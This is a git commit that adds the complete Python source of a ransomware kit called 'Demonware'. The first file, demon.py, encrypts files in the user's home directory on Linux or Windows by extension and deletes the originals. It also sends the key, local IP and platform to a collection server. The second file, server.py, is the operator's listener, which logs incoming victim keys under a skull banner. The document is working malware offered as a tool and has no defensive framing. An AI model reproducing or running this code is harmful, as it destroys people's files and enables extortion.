1b887ea7f7887a1dc4bba62321b712ad42a0c3bd
Leon V <33411715+leonv024@users.noreply.github.com>
2018-04-22 13:12:18 +0200

    Add files via upload

---
+++ demon.py
@@ -0,0 +1,87 @@
+import os, sys, socket, string, random, hashlib, getpass, platform
+from Crypto import Random
+from Crypto.Cipher import AES
+
+def getlocalip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('8.8.8.8', 80))
+    return s.getsockname()[0]
+
+def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
+      return ''.join(random.choice(chars) for _ in range(size))
+
+# Encryption
+def pad(s):
+    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
+
+def encrypt(message, key, key_size=256):
+    message = pad(message)
+    iv = Random.new().read(AES.block_size)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return iv + cipher.encrypt(message)
+
+def encrypt_file(file_name, key):
+    with open(file_name, 'rb') as fo:
+        plaintext = fo.read()
+    enc = encrypt(plaintext, key)
+    with open(file_name + ".DEMON", 'wb') as fo:
+        fo.write(enc)
+
+
+host = '127.0.0.1'
+port = 8989
+
+#key = hashlib.sha1(gen_string().encode('utf-8')).hexdigest()
+#print(len(key))
+key = hashlib.md5(gen_string()).hexdigest()
+platform = platform.system()
+
+# Encrypt file that endswith
+ext = ['.txt','.ppt','.pptx','.doc','.docx','.gif','.jpg','.png','.mp3','.ogg','.csv','.xls','.exe','.pdf', '.ods']
+
+def get_target():
+    # Encrypt on this location
+    # Users home on Linux
+    if platform == 'Linux':
+        target = '/home/' + getpass.getuser() + '/'
+        return target
+
+    # Users home on Windows
+    elif platform == 'Windows':
+        target = 'C:\\Users\\' + getpass.getuser() + '\\'
+        return target
+    else:
+        sys.exit(1) # Cannot find users home directory, skip MacOS.
+
+def start_encrypt(target, key):
+    try:
+        for path, subdirs, files in os.walk(target):
+            for name in files:
+                for i in ext:
+                    if name.endswith(i):
+                        encrypt_file(os.path.join(path, name), key)
+                        os.remove(os.path.join(path, name))
+
+        #os.remove(sys.argv[0]) # destroy encrypter when finished
+    except Exception as e:
+        pass # continue if error
+
+def connector():
+    server = socket.socket(socket.AF_INET)
+    server.settimeout(1)
+
+    try:
+        # Send Key
+        server.connect((host, port))
+        server.send('%s$%s$%s' % (getlocalip(), platform, key))
+
+        start_encrypt(get_target(), key)
+
+    except Exception as e:
+        # Do not send key, encrypt anyway.
+        start_encrypt(get_target(), key)
+
+try:
+    connector()
+except KeyboardInterrupt:
+    print("\033[1;91m[!]\033[0m Disconnected")
---
+++ server.py
@@ -0,0 +1,100 @@
+import os, sys, socket, select, argparse
+
+if len(sys.argv) < 2:
+    print('\033[31m[ERROR]\033[0m Please, set a port'); sys.exit(1)
+
+def parse_args():
+    # Create the arguments
+    parser = argparse.ArgumentParser(description='Server for demonware')
+    parser.add_argument("-p", "--port", help="Host the server on the given port")
+    return parser.parse_args()
+
+args = parse_args()
+
+host = ''
+socket_list = []
+port = int(args.port)
+
+def header():
+    header = 'Remote'.ljust(20), 'Local'.ljust(20), 'Platform'.ljust(20), 'key'
+    print('\033[37m{0[0]} {0[1]} {0[2]} {0[3]}\033[0m'.format(header))
+
+banner = '''\033[31m
+                 .:'                                  `:.
+                 ::'                                    `::
+                :: :.                                  .: ::
+                 `:. `:.             .             .:'  .:'
+                  `::. `::           !           ::' .::'
+                      `::.`::.    .' ! `.    .::'.::'
+                        `:.  `::::'':!:``::::'   ::'
+                        :'*:::.  .:' ! `:.  .:::*`:
+                       :: HHH::.   ` ! '   .::HHH ::
+                      ::: `H TH::.  `!'  .::HT H' :::
+                      ::..  `THHH:`:   :':HHHT'  ..::
+                      `::      `T: `. .' :T'      ::'
+                        `:. .   :         :   . .:'
+                          `::'               `::'
+                            :'  .`.  .  .'.  `:
+                            :' ::.       .:: `:
+                            :' `:::     :::' `:
+                             `.  ``     ''  .'
+                              :`...........':
+                              ` :`.     .': '
+                               `:  `"""'  :'
+ ______   _______  _______  _______  _                 _______  _______  _______
+(  __  \ (  ____ \(       )(  ___  )( (    /||\     /|(  ___  )(  ____ )(  ____ \\
+| (  \  )| (    \/| () () || (   ) ||  \  ( || )   ( || (   ) || (    )|| (    \/
+| |   ) || (__    | || || || |   | ||   \ | || | _ | || (___) || (____)|| (__
+| |   | ||  __)   | |(_)| || |   | || (\ \) || |( )| ||  ___  ||     __)|  __)
+| |   ) || (      | |   | || |   | || | \   || || || || (   ) || (\ (   | (
+| (__/  )| (____/\| )   ( || (___) || )  \  || () () || )   ( || ) \ \__| (____/\\
+(______/ (_______/|/     \|(_______)|/    )_)(_______)|/     \||/   \__/(_______/
+\033[0m
+'''
+
+def server():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind((host, port))
+    server_socket.listen(10)
+
+    # add server socket object to the list of readable connections
+    socket_list.append(server_socket)
+
+    print(banner)
+    print("\033[32mServer started on port [%s]\nWaiting...\n\033[0m" % int(port))
+    header() # Print the header
+
+    try:
+        while True:
+            ready_to_read,ready_to_write,in_error = select.select(socket_list,[],[],0)
+
+            for sock in ready_to_read:
+                # a new connection request recieved
+                if sock == server_socket:
+                    sockfd, addr = server_socket.accept()
+                    socket_list.append(sockfd)
+                else:
+                    try:
+                        data = sock.recv(1024)
+                        if data:
+                            ip = addr[0]
+                            local = data.split('$')[0]
+                            system = data.split('$')[1]
+                            key = data.split('$')[2]
+
+                            print('%s %s %s %s' % (ip.ljust(20), local.ljust(20), system.ljust(20), key))
+
+                        else:
+                            if sock in socket_list:
+                                socket_list.remove(sock)
+                    except:
+                        continue
+    except KeyboardInterrupt:
+        print('Closed...\n')
+
+
+    server_socket.close()
+
+if __name__ == "__main__":
+    sys.exit(server())
